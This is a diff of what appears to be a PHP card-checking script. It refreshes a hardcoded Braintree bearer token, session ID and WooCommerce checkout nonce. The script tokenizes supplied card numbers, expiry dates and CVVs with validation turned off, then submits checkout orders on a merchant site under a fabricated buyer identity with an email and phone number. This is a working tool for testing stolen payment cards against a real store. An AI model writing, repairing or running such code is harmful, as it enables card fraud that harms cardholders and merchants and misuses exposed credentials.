@@ -204,14 +204,14 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE3ODc1NjUsImp0aSI6ImM2MjZlY2M0LWMxNmYtNDJhYi1iYjNhLWQxMzA3MjNkOWM2MSIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.dSsQ3wN5VJQ88WPY5u-pe0jV0B5A3jAcfAh7EkVmytxH202DKgJoYzt8rOj4OCAFgF5_zKNLfn99FD2SQsnt2Q',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE4NDM1MzIsImp0aSI6IjFlNjM2OWE5LWJhNGYtNGI0My1iNDBkLTE2OWZlMWIwYTRmMCIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0._MSM6ZySLaoVk9lpReVJuHTOBvC7NqByAMjd81ybWkKzmSaaK5plrl6g5ykK2T6Cpp3Tf_z3bM2mN3Uc2MMxRw',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
 'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e91e779c-3a53-4486-a042-2fde3d488153"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"dbdc2b6d-fbe1-40ad-8ac5-0b8b0d6f79bd"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 $b_pago = curl_exec($ch);
 
@@ -270,7 +270,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=5182641524&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=24+moo+4+tambol+Pluakdaeng&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=86c59894d0&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_email=pubgkittu%40gmail.com&shipping_phone=5182641524&ship_to_different_address=1&shipping_first_name=Vincent&shipping_last_name=Warner&shipping_country=US&shipping_address_1=24+moo+4+tambol+Pluakdaeng&shipping_address_2=&shipping_city=Miami&shipping_state=FL&shipping_postcode=33101&payment_method=braintree_payment_gateway&braintree_payment_gateway_nonce='.$token.'&braintree_device_data=&bfwc_is_vaulted_nonce=&woocommerce-process-checkout-nonce=95681f8f32&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name=Vincent&billing_last_name=Warner&billing_country=US&billing_address_1=24+moo+4+tambol+Pluakdaeng&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_email=pubgkittu%40gmail.com');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
